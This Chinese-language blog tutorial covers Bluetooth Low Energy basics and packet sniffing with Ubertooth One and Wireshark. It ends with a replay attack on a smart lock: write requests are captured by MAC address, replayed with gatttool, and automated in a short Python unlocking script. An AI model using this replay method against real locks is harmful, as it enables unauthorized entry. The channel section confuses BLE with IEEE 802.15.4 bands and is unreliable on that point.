## 前言

低功耗蓝牙(Low Energy; LE)，又视为Bluetooth Smart或蓝牙核心规格4.0版本。其特点具备节能、便于采用，是蓝牙技术专为物联网(Internet of Things; IOT)开发的技术版本。

BLE主打功能是快速搜索，快速连接，超低功耗保持连接和传输数据，弱点是数据传输速率低，由于BLE的低功耗特点，因此普遍用于穿戴设备。

我们比较熟悉的网络有 Zigbee，WIFI、Bluetooth（传统蓝牙），三者之间的关系如下：

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640760-20160612132408699-1154851627.png)

不同的无线数据传输协议在数据传输速率利传输距离有各自的使用范围。Zigbee、蓝牙以及 WIFI 标准都是工作在 2.4GHz 频段的无线通信标准。

> 传统蓝牙数据传输速率小于 3Mbps，典型数据传输距离为 2-10m，蓝牙技术的典型应用是在两部手机之间进行小量数据的传输。
>
> WIFI 最高数据传输速率可达 50Mbps，典型数据传输距离在 30-100m，WIFI 技术提供了一种 Intemet 的无线接入技术。

### 标准

BLE分为三部分Service、Characteristic、Descriptor，这三部分都由UUID作为唯一标示符。一个蓝牙4.0的终端可以包含多个Service，一个Service可以包含多个Characteristic，一个Characteristic包含一个Value和多个Descriptor，一个Descriptor包含一个Value。

> BLE 规范中定义了 GAP（Generic Access Profile）和 GATT（Generic Attribute）两个基本配置文件。
>
> **GAP 层**负责设备访问模式和进程，包括设备发现，建立连接，终止连接。初始化安全特征和设备配置。
>
> **GATT 层**用于已连接的蓝牙设备之间的数据通信。

### **BLE特点&优势**

#### 高可靠性

对于无线通信而言，由于电磁波在传输过程中容易受很多因素的干扰，例如，障碍物的阻挡、天气状况等，因此，无线通信系统在数据传输过程中具有内在的不可靠性。蓝牙技术联盟 SIG 在指定蓝牙 4.0 规范时已经考虑到了这种数据传输过程中的内在的不确定性，在射频，基带协议，链路管理协议中采用可靠性措施，包括：差错检测和矫正，进行数据编解码，数据降噪等，极大地提高了蓝牙无线数据传输的可靠性，另外，使用自适应调频技术，能最大程度地减少和其他 2.4G 无线电波的串扰。

#### 低成本、低功耗

低功耗蓝牙支持两种部署方式：双模式和单模式，一般智能机上采用双模式，外设一般采用 BLE 单模。

BLE 技术可以应用于 8-bit MCU， 目前 TI 公司推出的兼容 BluetoothLE 协议的 SoC芯片 CC254X 每片价格在 7.6 元左右， 外接几个阻容器件构成的滤波电路和 PCB 天线即可实现网络节点的构建。Nodic的NRF51822也不过才10元人民币。

低功耗设计：蓝牙 4.0 版本强化了蓝牙在数据传输上的低功耗性能，功耗较传统蓝牙降低了 90%。

> **传统蓝牙设备**的待机耗电量一直是其缺陷之一，这与传统蓝牙技术采用16至32个频道进行广播有很大关系，而低功耗蓝牙仅适用 3个广播通道，且每次广播时射频的开启时间也有传统的 22.5ms 减少到 0.6~1.2ms，这两个协议规范的改变，大幅降低了因为广播数据导致的待机功耗。
>
> **低功耗蓝牙**设计用深度睡眠状态来替换传统蓝牙的空闲状态，在深度睡眠状态下，主机 Host 长时间处于超低的负载循环 Duty Cycle 状态，只在需要运作时由控制器来启动，由于主机较控制器消耗的能源更多，因此这样的设计也节省了更多的能源。

#### 快速启动、瞬间连接

此前蓝牙版本的启动速度非常缓慢，2.1 版本的蓝牙启动连接需要 6s 时间，而蓝牙4.0 版本仅需要 3ms 即可完成，几乎是瞬间连接。

#### 传输距离极大提供

传统蓝牙传输距离一般 2-10m，而蓝牙 4.0 的有效传输距离可以达到 60~100m，传输距离提升了 10 倍，极大开拓了蓝牙技术的应用前景。

#### 高安全性

为了保证数据传输的安全性，使用 AES-128 CCM 加密算法进行数据包加密认证，对于初学阶段，安全性问题可以暂时不考虑。

### 协议栈

协议栈内容请参考：[Understanding Bluetooth Advertising Packets](http://j2abro.blogspot.com.au/2014/06/understanding-bluetooth-advertising.html)一文。

中文版：http://blog.csdn.net/ooakk/article/details/7302425

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640760-20160612132751449-458187935.gif)

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640760-20160612132837433-1650370851.png)

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640760-20160612132851199-1020984862.png)

### 通信信道

BLE 工作在 ISM 频带，定义了两个频段，2.4GHz 频段和 896/915MHz 频带。在IEEE802.15.4 中共规定了 27 个信道：

> 在 2.4GHz 频段，共有 16 个信道，信道通信速率为 250kbps：
>
> 在 915MHz 频段，共有 10 个信道，信道通信速率为 40kbps：
>
> 在 868MHz 频段，有 1 个信道，信道通信速率为 20kbpS。

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640760-20160612132955824-30116257.png)

BLE 工作在 2.4GHz 频段，仅适用 3 个广播通道，适用所有蓝牙规范版本通用的自适应调频技术。

BlueTooth 有79个射频信道，按0-78排序，并于2402 MHz开始，以1 MHz分隔：

```
channel 00 : 2.402000000 Ghz
channel 01 : 2.403000000 Ghz
…
channel 78 : 2.480000000 Ghz
```

BTLE有40个频道（也称为信道），按37在第一个，后面由0-36，然后第39信道（那么38呢 :) ）第38信道位于10和11之间：

```
channel 37 : 2.402000000 Ghz
channel 00 : 2.404000000 Ghz
channel 01 : 2.406000000 Ghz
channel 02 : 2.408000000 Ghz
channel 03 : 2.410000000 Ghz
channel 04 : 2.412000000 Ghz
channel 05 : 2.414000000 Ghz
channel 06 : 2.416000000 Ghz
channel 07 : 2.418000000 Ghz
channel 08 : 2.420000000 Ghz
channel 09 : 2.422000000 Ghz
channel 10 : 2.424000000 Ghz
channel 38 : 2.426000000 Ghz
channel 11 : 2.428000000 Ghz
channel 12 : 2.430000000 Ghz
channel 13 : 2.432000000 Ghz
channel 14 : 2.434000000 Ghz
channel 15 : 2.436000000 Ghz
channel 16 : 2.438000000 Ghz
channel 17 : 2.440000000 Ghz
channel 18 : 2.442000000 Ghz
channel 19 : 2.444000000 Ghz
channel 20 : 2.446000000 Ghz
channel 21 : 2.448000000 Ghz
channel 22 : 2.450000000 Ghz
channel 23 : 2.452000000 Ghz
channel 24 : 2.454000000 Ghz
channel 25 : 2.456000000 Ghz
channel 26 : 2.458000000 Ghz
channel 27 : 2.460000000 Ghz
channel 28 : 2.462000000 Ghz
channel 29 : 2.464000000 Ghz
channel 30 : 2.466000000 Ghz
channel 31 : 2.468000000 Ghz
channel 32 : 2.470000000 Ghz
channel 33 : 2.472000000 Ghz
channel 34 : 2.474000000 Ghz
channel 35 : 2.476000000 Ghz
channel 36 : 2.478000000 Ghz
channel 39 : 2.480000000 Ghz
```

**40个频道中:37、38、39为广播信道,另外37个频道用于数据的传输：**

使用德州仪器（TI）CC2540蓝牙低功耗模块配合官方的SmartRF协议软件包监听器：PACKET-SNIFFER，可对三个蓝牙广播信道进行嗅探。

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640760-20160612133106402-2011845399.png)

使用方法可参考：[Ti.com.cn/packet-sniffer](http://www.ti.com.cn/tool/cn/packet-sniffer) **这种嗅探方案优点是廉价,不足是只能嗅探到广播信道的数据包，无法捕获连接完成后也就是设备通信过程中的数据包：**

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640760-20160612133159183-1110036838.png)

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640760-20160612133216621-1050231414.png)

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640760-20160612133241918-997698360.png)

基于HackRF嗅探蓝牙数据包实际上也是可行的：

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640760-20160612133307808-875271866.png)



## 使用 Ubertooth One 嗅探蓝牙数据包

我们说到上面的方案只能嗅探到广播信道的数据包，无法捕获通信过程中的蓝牙数据包，接下来我们将使用Ubertooth One来弥补上面方案的缺陷。

根据 Ubertooth 的 wiki（https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide），在构建 libbtbb 和 Ubertooth 工具之前，需要先安装一些依赖。可以从操作系统的软件包存储库中找到许多这些文件，例如：

### 安装依赖

这里我是在树莓派（Debian / Ubuntu）下进行安装，根据个人的系统来执行相应的命令：

**Debian / Ubuntu**

```
sudo apt-get install cmake libusb-1.0-0-dev make gcc g++ libbluetooth-dev \
pkg-config libpcap-dev python-numpy python-pyside python-qt4
```

**Fedora / Red Hat**

```
su -c "yum install libusb1-devel make gcc wget tar bluez-libs-devel"
```

### 安装 libbtbb

接下来，需要为Ubertooth工具构建蓝牙基带库（libbtbb），以解码蓝牙数据包：

```
wget https://github.com/greatscottgadgets/libbtbb/archive/2018-12-R1.tar.gz -O libbtbb-2018-12-R1.tar.gz
tar -xf libbtbb-2018-12-R1.tar.gz
cd libbtbb-2018-12-R1
mkdir build
cd build
cmake ..
make
sudo make install
```

### 安装 Ubertooth tools

Ubertooth存储库包含用于嗅探蓝牙数据包，配置Ubertooth和更新固件的主机代码。使用以下方法构建和安装的：

```
wget https://github.com/greatscottgadgets/ubertooth/releases/download/2018-12-R1/ubertooth-2018-12-R1.tar.xz
tar xf ubertooth-2018-12-R1.tar.xz
cd ubertooth-2018-12-R1/host
mkdir build
cd build
cmake ..
make
sudo make install
```

**查看 Ubertooth one 固件版本**

```
$ sudo ubertooth-util -v     // Ubertooth one 固件版本
$ ubertooth-rx -V            // ubertooth tools 版本
libubertooth 1.1 (2018-12-R1), libbtbb 1.0 (2018-06-R1)
```

**Linux 用户**: 如果是第一次安装，或者收到有关查找库的错误：

> ubertooth-util: error while loading shared libraries: libubertooth.so.1: cannot open shared object file: No such file or directory

则应运行 sudo ldconfig：

```
$ sudo ldconfig
$ sudo ubertooth-util -v
Firmware version: 2018-12-R1 (API:1.06)
```

### 安装 Wireshark

Wireshark版本1.12和更高版本默认包含Ubertooth BLE插件。[只需](https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark)做一些工作，就可以将[Ubertooth中的BLE直接捕获到Wireshark中](https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark)。

利用Wireshark BTBB和BR / EDR插件，可以在Wireshark GUI中分析和剖析使用Kismet捕获的蓝牙基带流量。它们与其余的Ubertooth和libbtbb软件分开构建。

传递给cmake的目录`MAKE_INSTALL_LIBDIR`因系统而异，但应为现有Wireshark插件（例如`asn1.so`和）的位置`ethercat.so`。在macOS上，这是可能的`/Applications/Wireshark.app/Contents/PlugIns/wireshark/`。

```
sudo apt-get install wireshark wireshark-dev libwireshark-dev cmake
cd libbtbb-2018-12-R1/wireshark/plugins/btbb
mkdir build
cd build
cmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/arm-linux-gnueabihf/wireshark/plugins/ ..
make
sudo make install
```

然后为BT BR / EDR插件重复上述步骤：

```
sudo apt-get install wireshark wireshark-dev libwireshark-dev cmake
cd libbtbb-2018-12-R1/wireshark/plugins/btbredr
mkdir build
cd build
cmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/arm-linux-gnueabihf/wireshark/plugins/ ..
make
sudo make install
```

#### 在Wireshark中捕获BLE

可以构建使用 Wireshark 在 Wireshark 中捕获BLE。

1. 运行命令： `mkfifo /tmp/pipe`

   ```
   pi@raspberrypi:~/ubertooth $ mkfifo /tmp/pipe
   ```

2. 新建一个终端窗口，打开 Wireshark

3. 单击**捕获**（Capture ）->**选项**（Options）

4. 点击窗口右侧的**管理接口**（Manage Interfaces）按钮

   ![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021151624454.png)

5. 在**管道**（Pipe）文本框中，键入“ /tmp/pipe”

6. 单击OK保存

7. 点击“开始”

   ![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021151956105.png)

在终端中，运行`ubertooth-btle`：

```
ubertooth-btle -f -c /tmp/pipe
```

在 Wireshark 窗口中，可以看到数据包滚动。

**注意**：如果碰到 [User encapsulation not handled: DLT=147, check your Preferences->Protocols->DLT_USER](https://github.com/greatscottgadgets/ubertooth/issues/61)  错误，如图

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021153531929.png)

所需步骤是：

1. 单击编辑（Edit）->首选项（Preferences）

2. 单击协议（Protocols）-> DLT_USER

3. 单击编辑（封装表）

   ![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021153847204.png)

4. 点击加号（+）

5. 在DLT下，选择“用户0（DLT = 147）”（如果错误消息显示的DLT号与147不同，请适当调整此选择）

   ![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021154238969.png)

6. 在有效载荷协议下，输入：btle

   ![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021154336154.png)

7. 点击OK

8. 点击OK

## 使用 Ubertooth One 嗅探与重放数据

现有一个BLE 设备的蓝牙锁，接下来使用 Ubertooth One 嗅探抓包，然后再数据重放。

<img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640.webp" alt="img" style="zoom:50%;" />

在树莓派命令终端下（需加一个蓝牙适配器），输入`hciconfig dev`查看电脑的当前适配器设备，输入`sudo hciconfig hci0 up`激活蓝牙适配器。

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030140346860.png)

激活蓝牙锁后，输入`sudo hcitool lescan`搜索周围的蓝牙设备，搜索到设备后按`CTRL + C`停止搜索，设备名称为`smart lock`，是一个蓝牙串口设备，MAC地址`74:e1:82:04:53:3f`。

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030140627147.png)

获取到蓝牙锁的 MAC 地址后，我们可以指定嗅探 MAC 进行抓包，命令：

```
ubertooth-btle -f -t 74:e1:82:04:53:3f -c /tmp/pipe
```

Wireshark 的步骤和之前是一样的，选择管道接口`/tmp/pipe`。准备完毕之后，我们先用手机连接蓝牙锁，正常开启一遍，随后 Wireshark 出现滚动的数据包 。

使用显示过滤器，可以显示仅连接请求和非零数据包：

```
btle.data_header.length > 0 || btle.advertising_header.pdu_type == 0x05
```

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030133816824.png)

仅属性读取响应，写入请求和通知，我们只关注写入请求的包，如下：

```
btatt.opcode in { 0x0b 0x12 0x1b }
```

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030134225353.png)

现在一共抓到三个写入请求的包，其 Master Address 值为 68:df:dd:72:16:ee（小米手机蓝牙 MAC），Slave Address 为蓝牙锁 MAC。

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030134109771.png)

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030134133320.png)

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030134304295.png)

抓到包后，使用 gatttool 与 BLE 设备蓝牙锁进行通讯。

输入命令`gatttool -b 74:e1:82:04:53:3f -I`使用interactive方式连接设备。

help 打印帮助信息：

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030141058132.png)

>\>connect              与BLE设备连接。
>
>\>primary              寻找BLE中可用的服务。
>
>\>characteristics          查看设备服务的特征值。
>
>\>char-read-hnd 0x0026       读取特征值对应句柄的数值。
>
>\>char-write-req 0x0029 55100144  发送55100144命令到句柄0x0029（控制挂锁开锁）
>
>\>sec-level high          设置安全等级为高，可以让手环长时间保持连接。

激活蓝牙锁之后，首先执行 connect 命令建立通讯，随后依次写入请求。

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030142646314.png)

执行以上操作后，蓝牙锁开启成功。

python 脚本如下：

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#usage: pip install pwn
from pwn import *
 
argv = ["gatttool","-b","74:e1:82:04:53:3f","-I"]
sh = process(argv)
sh.sendline("connect")
print ('-----请开启锁-----')
sh.recvuntil("Connection successful")
print ('-----正在开锁-----')
sh.sendline("char-write-req 0x0026 0100")
sh.recvuntil("written successfully")
sh.sendline("char-write-req 0x0029 554100000014")
sh.recvuntil("written successfully")
sh.sendline("char-write-req 0x0029 55100144")
sh.recvuntil("written successfully")
print ('-----开锁成功-----')
sh.close()
```
